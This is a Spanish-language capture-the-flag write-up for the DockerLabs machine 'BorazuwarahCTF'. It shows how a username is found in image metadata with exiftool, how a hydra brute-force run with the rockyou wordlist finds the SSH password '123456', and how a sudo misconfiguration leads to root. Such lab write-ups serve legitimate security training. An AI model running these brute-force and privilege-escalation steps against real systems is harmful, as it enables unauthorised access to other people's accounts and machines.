---
title: BorazuwarahCTF
date: 2025-09-17 11:00:00 +0200
categories: [writeup, dockerlabs]
tags: [dockerlabs, hydra, ssh, fuerza bruta]     
image:
    path: https://dockerlabs.es/static/images/logos/logo.png
    alt: Docker Labs
---

# BorazuwarahCTF

>BorazuwarahCTF
Autor: BorazuwarahCTF
Dificultad: Muy Fácil
Fecha de creación: 28/05/2024
{: .prompt-tip }



## ⚠️ Vulnerabilidad
Information Disclosure

## 🔭 Reconocimiento:
 Se encuentran metadatos en la imagen del "huevo de chocolate de la marca Kinder" http://10.88.0.2/imagen.jpeg

``` shell
└─$ exiftool imagen.jpeg
ExifTool Version Number         : 13.25
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2025:09:17 22:23:13+02:00
File Access Date/Time           : 2025:09:17 22:23:13+02:00
File Inode Change Date/Time     : 2025:09:17 22:23:13+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

## 🚚 Distribución:
GET http

## 🪲 Explotación:
Alguien ha dejado información sobre un usuario de sistema, información que cualquier adversario podría aprovechar

## ⚠️ Vulnerabilidad
Brute Force

## 🔭 Reconocimiento:

``` shell
└─$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://10.88.0.2 -t64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-17 22:29:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.88.0.2:22/
[22][ssh] host: 10.88.0.2   login: borazuwarah   password: 123456
```

## 🚚 Distribución:
Fuerza bruta contra el protocolo SSH con herramientas como hydra

## 🪲 Explotación:
Fuerza bruta contra el protocolo SSH permite adquirir credenciales debiles de usuarios.

## ⚠️ Vulnerabilidad
Default or Weak Passwords

## 🔭 Reconocimiento:

``` shell
└─$ ssh borazuwarah@10.88.0.2
borazuwarah@10.88.0.2's password:
Linux 311f0704bcea 6.12.33+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.33-1kali1 (2025-06-25) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
borazuwarah@311f0704bcea:~$ sudo -l
Matching Defaults entries for borazuwarah on 311f0704bcea:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
User borazuwarah may run the following commands on 311f0704bcea:
(ALL : ALL) ALL
(ALL) NOPASSWD: /bin/bash
```

## 🚚 Distribución: SSH

## 🪲 Explotación:
El usuario no ha sido requerido a seguir una política de contraseñas fuertes, por otro lado si se le ha dado privilegios de superusuario.

## 👽 Acciones: Se convierte en usuario root tomando control total

``` shell
borazuwarah@311f0704bcea:~$ sudo su
[sudo] password for borazuwarah:
root@311f0704bcea:/home/borazuwarah# whoami
root
```

Este write up ha sido realizado en gran medida con la herramienta [DarkReport](../darkreport)